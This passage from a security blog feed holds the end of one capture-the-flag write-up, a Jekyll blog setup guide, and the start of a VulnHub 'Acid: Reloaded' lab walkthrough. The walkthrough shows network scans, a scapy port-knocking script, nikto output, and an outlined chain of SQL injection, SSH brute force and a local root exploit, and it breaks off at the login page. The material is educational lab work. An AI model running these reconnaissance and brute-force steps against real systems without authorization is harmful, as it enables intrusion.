</span><span class='line'>-rw-r--r--.  <span class="m">1</span> root root   <span class="m">129</span> Dec <span class="m">29</span>  <span class="m">2013</span> .tcshrc
</span><span class='line'>-r--------.  <span class="m">1</span> root root <span class="m">14892</span> Jul <span class="m">14</span> 14:25 flag.txt
</span><span class='line'>bash-4.2# cat /root/flag.txt
</span><span class='line'>cat /root/flag.txt
</span><span class='line'>Well <span class="k">done</span>!
</span><span class='line'>
</span><span class='line'>Here<span class="err">&#39;</span>s your flag: 3eb030c6ab099b0a355712fe38d59ffb
</span><span class='line'>
</span><span class='line'>Ascii Art: Mark Van Hooren
</span><span class='line'><span class="o">(</span>http://www.retrojunkie.com/asciiart/cartchar/snowwhit.htm<span class="o">)</span>
</span><span class='line'>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-<span class="o">=</span>-
</span><span class='line'>... turncate ...
</span></code></pre></td></tr></table></div></figure>


<p>Thanks Sagi- and cheers g0blin!</p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Notes] Setup jekyll Harmony theme on GitHub]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/10/03/welcome-and-thanks/"/>
    <updated>2015-10-03T21:05:12+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/10/03/welcome-and-thanks</id>
    <content type="html"><![CDATA[<p><strong><font color="red">[!!]</font></strong> Now I have moved my blog back to <a href="http://octopress.org/" title="Octopress -- A blogging framework for hackers">Octopress</a> with <a href="https://github.com/macjasp/cleanpress" title="Octopress Theme CleanPress">CleanPress</a> theme. However the last two days playing with Harmony pushed me to get a further understanding about <a href="https://github.com/" title="GitHub">github</a>, <a href="https://pages.github.com/" title="GitHub Pages">github pages</a> and <a href="https://jekyllrb.com/" title="All about Jekyll">jekyll</a>.</p>

<!-- more -->


<hr />

<p>I am using the Jekyll theme: <a href="https://github.com/gayanvirajith/Harmony" title="Jekyll Theme Harmony">Harmony</a></p>

<p>If you are new to github/git, the following link is highly recommanded to check first: <a href="https://try.github.io/levels/1/challenges/1" title="Try github in 15 mins">Learn git in 15 mins</a></p>

<p>If you want to try it on your local system, you probably will be asked to install the latest Ruby. Because Jekyll requires Ruby 2.0.0 or above, you can <a href="https://rvm.io/rvm/install" title="Install RVM">install RVM</a> in following commands (in this case I use Kali Linux, step this if you are using Kali 2):</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># install RVM mpapis public key</span>
gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
<span class="c"># download and install RVM stable with latest ruby</span>
<span class="se">\c</span>url -sSL https://get.rvm.io <span class="p">|</span> bash -s stable --ruby
<span class="c"># after installed, to start using RVM</span>
<span class="nb">source</span> /usr/local/rvm/scripts/rvm
<span class="c"># check current ruby version</span>
ruby --version</code></pre></div>


<h2>Set up jerkll theme on local system (Kali Linux):</h2>

<ol>
<li><p><a href="https://help.github.com/articles/create-a-repo/" title="Create a Repo">Create a Repo</a> on github (Note: In order to use Free github page domain, this Repo must use your github username as the repo name: <code>f4l13n5n0w.github.io</code> in my case</p></li>
<li><p>run the following commands in my Kali linux:</p></li>
</ol>


<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /opt
<span class="c"># download Jekyll theme on my local system</span>
git clone https://github.com/gayanvirajith/harmony.git
<span class="nb">cd </span>harmony
<span class="c"># install bundler</span>
gem install bundler
<span class="c"># install dependencies by using bundle</span>
bundle install
<span class="c"># set it up on local, will listen on http://127.0.0.1:4000</span>
jekyll serve</code></pre></div>


<p>You might get the following error when run <code>jekyll serve</code>.</p>

<pre><code>root@kali:/opt/harmony# jekyll serve
/usr/local/rvm/gems/ruby-2.2.1/gems/execjs-2.6.0/lib/execjs/runtimes.rb:48:in `autodetect': Could not find a JavaScript runtime. See https://github.com/rails/execjs for a list of available runtimes. (ExecJS::RuntimeUnavailable)
    from /usr/local/rvm/gems/ruby-2.2.1/gems/execjs-2.6.0/lib/execjs.rb:5:in `&lt;module:ExecJS&gt;'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/execjs-2.6.0/lib/execjs.rb:4:in `&lt;top (required)&gt;'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/coffee-script-2.4.1/lib/coffee_script.rb:1:in `require'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/coffee-script-2.4.1/lib/coffee_script.rb:1:in `&lt;top (required)&gt;'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/coffee-script-2.4.1/lib/coffee-script.rb:1:in `require'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/coffee-script-2.4.1/lib/coffee-script.rb:1:in `&lt;top (required)&gt;'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-coffeescript-1.0.1/lib/jekyll-coffeescript.rb:2:in `require'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-coffeescript-1.0.1/lib/jekyll-coffeescript.rb:2:in `&lt;top (required)&gt;'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-2.4.0/lib/jekyll/deprecator.rb:46:in `require'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-2.4.0/lib/jekyll/deprecator.rb:46:in `block in gracefully_require'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-2.4.0/lib/jekyll/deprecator.rb:44:in `each'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-2.4.0/lib/jekyll/deprecator.rb:44:in `gracefully_require'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-2.4.0/lib/jekyll.rb:141:in `&lt;top (required)&gt;'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-2.4.0/bin/jekyll:6:in `require'
    from /usr/local/rvm/gems/ruby-2.2.1/gems/jekyll-2.4.0/bin/jekyll:6:in `&lt;top (required)&gt;'
    from /usr/local/rvm/gems/ruby-2.2.1/bin/jekyll:23:in `load'
    from /usr/local/rvm/gems/ruby-2.2.1/bin/jekyll:23:in `&lt;main&gt;'
    from /usr/local/rvm/gems/ruby-2.2.1/bin/ruby_executable_hooks:15:in `eval'
    from /usr/local/rvm/gems/ruby-2.2.1/bin/ruby_executable_hooks:15:in `&lt;main&gt;'
</code></pre>

<p>In order to fix it up, you need to insert <code>gem 'therubyracer'</code> into the file <code>Gemfile</code> as follow and run <code>bundle install</code> again (Note: github-page server do not have this problem):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">source &#39;https://rubygems.org&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">require &#39;json&#39;</span>
</span><span class='line'><span class="l-Scalar-Plain">require &#39;open-uri&#39;</span>
</span><span class='line'><span class="l-Scalar-Plain">versions = JSON.parse(open(&#39;https://pages.github.com/versions.json&#39;).read)</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">gem &#39;therubyracer&#39;</span>
</span><span class='line'><span class="l-Scalar-Plain">gem &#39;github-pages&#39;, versions[&#39;github-pages&#39;]</span>
</span><span class='line'><span class="l-Scalar-Plain">gem &#39;rake&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>If everything is good, after run <code>jekyll serve</code>, you will be able to access your blog on <code>http://127.0.0.1:4000</code></p>

<p>Next important thing is to modify the configuration file <code>_config.yml</code>.</p>

<p>The paramters <code>baseurl</code> and <code>url</code> have to be set correctly in order to make your site works</p>

<p><font color="red">Note:</font>
If you are going to set the blog under the root directory, you have to set <code>baseurl</code> to <code> or ''</code> as follow (<em><font color="red">DO NOT</font> set it to &lsquo;/&rsquo;</em>):</p>

<pre><code># Base URL
baseurl: 

# Site live URL
# url: http://f4l13n5n0w.github.io

# Localhost 
url: http://127.0.0.1:4000  
</code></pre>

<p>Set <code>url</code> to <code>http://127.0.0.1:4000</code> when developing locally and <font color="red">DO NOT</font> forget to change it back to your github page&rsquo;s link (in my case is <a href="http://f4l13n5n0w.github.io">http://f4l13n5n0w.github.io</a>)</p>

<h2>Update your site to github</h2>

<p>After you customized your blog locally, using the following code to publish it to github.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /opt/harmony
rm -rf _site
<span class="nb">cd</span> /opt
<span class="c"># git clone my blog Repo on my local system</span>
git clone https://github.com/F4l13n5n0w/F4l13n5n0w.github.io.git
<span class="nb">cd </span>F4l13n5n0w.github.io
<span class="c"># copy all the files from Jekyll theme to my blog repo</span>
cp -rf ../harmony/* ./
git add --all
git commit -m <span class="s1">&#39;Initial website&#39;</span>
<span class="c"># push it back to github, now wait couple of seconds or even minutes, you will find your blog already up from the github.io link (in my case: http://f4l13n5n0w.github.io)</span>
git push origin master</code></pre></div>


<h2>Further reading</h2>

<ul>
<li><a href="https://daringfireball.net/projects/markdown/syntax">Markdown syntax</a></li>
<li><a href="https://daringfireball.net/projects/markdown/basics">Markdown basics</a></li>
<li><a href="https://github.com/adam-p/markdown-here/wiki/Markdown-Cheatsheet">Markdown cheatsheet</a></li>
<li><a href="https://help.github.com/index.html">GitHub Help</a></li>
</ul>


<h2>Special Thanks</h2>

<p>After two nights scratching hair and friends' help, I finally got my blog back with refresh theme!</p>

<p><a href="http://www.anthonyferrillo.net/blog/">Anthony Ferrillo</a>
Bumped into his blog when I was checking new challenges on <a href="https://www.vulnhub.com/" title="VulnHub">VulnHub</a>, then I make myself incorrigible to upgrade my blog to the new beautiful theme. T.T</p>

<p><a href="http://gayan.me/">Gayan Virajith</a>
The coder of the Harmony theme, whom is very patient and helpful. Very nice and tidy theme, great job~</p>

<p>Special Thanks to you guys for your time and quick reply when I got stuck in setting this up, help and guide me to put it through. All great people and nice to chat with you~</p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]acid_reloaded]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/09/12/acid-reloaded/"/>
    <updated>2015-09-12T21:49:42+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/09/12/acid-reloaded</id>
    <content type="html"><![CDATA[<p><strong>Acid: Reloaded</strong> is created by <a href="https://twitter.com/@m_avinash143">Avinash Kumar Thapa</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/acid-reloaded,127/">here</a>.</p>

<!-- more -->


<h2>Links</h2>

<p>watch video online:</p>

<iframe src='http://player.vimeo.com/video/139052982?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.1.1.139/24</em>)</p>

<p>Target: Acid: Server (<em>10.1.1.130/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Ports knocking to active hidden ports</li>
<li>Hidden paths and files can be found via tool <code>dirbuster</code></li>
<li>Web login bypass by add HTTP header <code>Referer</code> in Request</li>
<li>SQL injection vulnerability exists in <code>http://10.1.1.139:33447/bin/l33t_haxor.php?id=</code>, exploit it and check database to find hidden file location <code>UB3R/strcpy.exe</code></li>
<li>Download and analyze the EXE file, found it binded with other files, use <code>foremost</code> tool to recover hidden files and find XML contacts file <code>Avinash.contact</code></li>
<li>Making a dictionary file from the contact file, here need to note that there is a base64 encoded string, decode it and put in dictionary file</li>
<li>use HYDRA to brute force SSH service with dictionary file and found cracked login <code>makke/NooB@123</code></li>
<li>Login as user <code>makke</code>, poking around and found Overlayfs Local Root (CVE-2015-1328) vulnerability exist and exploit it to get ROOT</li>
<li>overlayfs Local Root exploit (CVE-2015-1328) exist, exploit it to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">unicornscan</font> &amp; <font color="FF8000">nmap</font>]</li>
<li>Write python script to make port knocking to active filtered ports</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Web application scanning by Nikto to find more details or vulnerabilities [<font color="FF8000">nikto</font>]</li>
<li>Brute force scan to find hidden path [<font color="FF8000">dirbuster</font>]</li>
<li>Found the hidden web login page and bypass it</li>
<li>Exploit SQL injection vulnerability found in <code>/bin/l33t_haxor.php?id=</code> to get hidden file location <code>UB3R/strcpy.exe</code></li>
<li>Use <code>foremost</code> to recover hidden files in <code>strcpy.exe</code> [<font color="FF8000">foremost</font>]</li>
<li>Create dictionary file and use HYDRA to brute force SSH login, and found <code>makke/NooB@123</code></li>
<li>Enumeration and found the server is vulnerable to CVE-2015-1328, exploit it to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/dneufeld/unicornscan">unicornscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">dirbuster</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://foremost.sourceforge.net/">foremost</a></li>
<li><a href="https://www.thc.org/thc-hydra/">hydra</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using arp-scan as routine to detect the target&rsquo;s IP address (10.1.1.139 in this case).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink type: EN10MB (Ethernet)
</span><span class='line'>Starting arp-scan 1.9 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
</span><span class='line'>10.1.1.1  00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2  00:50:56:fd:d1:6b   VMware, Inc.
</span><span class='line'>10.1.1.139    00:0c:29:bb:6e:b3   VMware, Inc.
</span><span class='line'>10.1.1.254    00:50:56:e3:03:1b   VMware, Inc.
</span><span class='line'>
</span><span class='line'>4 packets received by filter, 0 packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: 256 hosts scanned in 2.611 seconds (98.05 hosts/sec). 4 responded</span></code></pre></td></tr></table></div></figure>


<p>10.1.1.139 is our Target!</p>

<p>Then run uniscornscan to detect opening ports on the target (unicornscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# us -msf -T4 -p1-65535 -Iv 10.1.1.139
</span><span class='line'>adding 10.1.1.139/32 mode `TCPscan' ports `1-65535' pps 300
</span><span class='line'>using interface(s) eth0
</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
</span><span class='line'>connected 10.1.1.130:39969 -> 10.1.1.139:22
</span><span class='line'>TCP open 10.1.1.139:22  ttl 64
</span><span class='line'>sender statistics 288.7 pps with 65535 packets sent total
</span><span class='line'>listener statistics 131072 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open               ssh[   22]     from 10.1.1.139  ttl 64</span></code></pre></td></tr></table></div></figure>


<p>Then I connect to target via SSH to grab banner.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ssh 10.1.1.139
</span><span class='line'>    _    ____ ___ ____        ____  _____ _     ___    _    ____  _____ ____  
</span><span class='line'>   / \  / ___|_ _|  _ \      |  _ \| ____| |   / _ \  / \  |  _ \| ____|  _ \ 
</span><span class='line'>  / _ \| |    | || | | |_____| |_) |  _| | |  | | | |/ _ \ | | | |  _| | | | |
</span><span class='line'> / ___ \ |___ | || |_| |_____|  _ &lt;| |___| |__| |_| / ___ \| |_| | |___| |_| |
</span><span class='line'>/_/   \_\____|___|____/      |_| \_\_____|_____\___/_/   \_\____/|_____|____/ 
</span><span class='line'>
</span><span class='line'>                                  -by Acid
</span><span class='line'>
</span><span class='line'>Wanna Knock me out ??? 
</span><span class='line'>3.2.1 Let's Start the Game.
</span><span class='line'>                                                                              
</span><span class='line'>root@10.1.1.139's password:</span></code></pre></td></tr></table></div></figure>


<p>Looks like we need ports knocking to find hidden ports. Then the following python script will do the port knocking</p>

<figure class='code'><figcaption><span>knock.py </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'>
</span><span class='line'><span class="n">target</span> <span class="o">=</span> <span class="s">&#39;10.1.1.139&#39;</span>
</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">4</span><span class="p">)):</span>
</span><span class='line'>    <span class="n">packet</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="n">target</span><span class="p">)</span><span class="o">/</span><span class="n">TCP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="n">x</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="s">&quot;S&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">response</span> <span class="o">=</span> <span class="n">sr1</span><span class="p">(</span><span class="n">packet</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">response</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;[+]knocking port &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+]Done!&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then use unicornscan to check again, found another port <code>33447</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# us -msf -T4 -p1-65535 -Iv 10.1.1.139
</span><span class='line'>adding 10.1.1.139/32 mode `TCPscan' ports `1-65535' pps 300
</span><span class='line'>using interface(s) eth0
</span><span class='line'>scaning 1.00e+00 total hosts with 6.55e+04 total packets, should take a little longer than 3 Minutes, 45 Seconds
</span><span class='line'>connected 10.1.1.130:22339 -> 10.1.1.139:22
</span><span class='line'>TCP open 10.1.1.139:22  ttl 64
</span><span class='line'>connected 10.1.1.130:38957 -> 10.1.1.139:33447
</span><span class='line'>TCP open 10.1.1.139:33447  ttl 64
</span><span class='line'>sender statistics 277.8 pps with 65535 packets sent total
</span><span class='line'>listener statistics 131078 packets recieved 0 packets droped and 0 interface drops
</span><span class='line'>TCP open               ssh[   22]     from 10.1.1.139  ttl 64 
</span><span class='line'>TCP open           unknown[33447]     from 10.1.1.139  ttl 64</span></code></pre></td></tr></table></div></figure>


<p>Using NMAP scan to detect more information about opening services, and found WEB service is running on port <code>33447</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/acid_reload# nmap -sV -v -p22,33447 -T4 10.1.1.139
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-11 07:26 EDT
</span><span class='line'>NSE: Loaded 33 scripts for scanning.
</span><span class='line'>Initiating ARP Ping Scan at 07:26
</span><span class='line'>Scanning 10.1.1.139 [1 port]
</span><span class='line'>Completed ARP Ping Scan at 07:26, 0.24s elapsed (1 total hosts)
</span><span class='line'>Initiating Parallel DNS resolution of 1 host. at 07:26
</span><span class='line'>Completed Parallel DNS resolution of 1 host. at 07:26, 0.02s elapsed
</span><span class='line'>Initiating SYN Stealth Scan at 07:26
</span><span class='line'>Scanning 10.1.1.139 [2 ports]
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.139
</span><span class='line'>Discovered open port 33447/tcp on 10.1.1.139
</span><span class='line'>Completed SYN Stealth Scan at 07:26, 0.21s elapsed (2 total ports)
</span><span class='line'>Initiating Service scan at 07:26
</span><span class='line'>Scanning 2 services on 10.1.1.139
</span><span class='line'>Completed Service scan at 07:26, 11.04s elapsed (2 services on 1 host)
</span><span class='line'>NSE: Script scanning 10.1.1.139.
</span><span class='line'>Initiating NSE at 07:26
</span><span class='line'>Completed NSE at 07:26, 0.34s elapsed
</span><span class='line'>Nmap scan report for 10.1.1.139
</span><span class='line'>Host is up (0.00050s latency).
</span><span class='line'>PORT      STATE SERVICE VERSION
</span><span class='line'>22/tcp    open  ssh     OpenSSH 6.7p1 Ubuntu 5ubuntu1.3 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
</span><span class='line'>MAC Address: 00:0C:29:BB:6E:B3 (VMware)
</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Read data files from: /usr/bin/../share/nmap
</span><span class='line'>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 12.65 seconds
</span><span class='line'>           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)</span></code></pre></td></tr></table></div></figure>


<p>Run NIKTO scan to check the web application and found hidden folder <code>/bin/</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nikto -host http://10.1.1.139:3344/
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ No web server found on 10.1.1.139:3344
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ 0 host(s) tested
</span><span class='line'>root@kali:~# nikto -host http://10.1.1.139:33447/
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          10.1.1.139
</span><span class='line'>+ Target Hostname:    10.1.1.139
</span><span class='line'>+ Target Port:        33447
</span><span class='line'>+ Start Time:         2015-09-11 07:31:36 (GMT-4)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.4.10 (Ubuntu)
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0x2aa 0x51e107200fa1d 
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
</span><span class='line'>+ IP address found in the 'location' header. The IP is "127.0.1.1".
</span><span class='line'>+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.1.1:33447/images/".
</span><span class='line'>+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
</span><span class='line'>+ OSVDB-3092: /bin/: This might be interesting...
</span><span class='line'>+ OSVDB-3092: /bin/: This might be interesting... possibly a system shell found.
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ 8330 requests: 0 error(s) and 11 item(s) reported on remote host
</span><span class='line'>+ End Time:           2015-09-11 07:31:58 (GMT-4) (22 seconds)
</span><span class='line'>---------------------------------------------------------------------------</span></code></pre></td></tr></table></div></figure>


<p>check the new folder <code>/bin/</code> found a login page. By checking the source code, the login process function is in <code>/includes/validation.php</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;h2&gt;</span>Login to your account<span class="nt">&lt;/h2&gt;</span>   <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;includes/validation.php&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span> <span class="na">name=</span><span class="s">&quot;login_form&quot;</span><span class="nt">&gt;</span>  Email: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;Email Address&quot;</span> <span class="na">name=</span><span class="s">&quot;email&quot;</span> <span class="na">maxlength=</span><span class="s">&quot;20&quot;</span> <span class="nt">/&gt;</span>  Password: <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;Password&quot;</span> <span class="na">name=</span><span class="s">&quot;password&quot;</span> <span class="na">id=</span><span class="s">&quot;password&quot;</span><span class="nt">/&gt;</span>  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;Login&quot;</span> <span class="na">onclick=</span><span class="s">&quot;formhash(this.form, this.form.password);&quot;</span> <span class="nt">/&gt;</span>  <span class="nt">&lt;/form&gt;</span>   <span class="nt">&lt;/form&gt;</span>
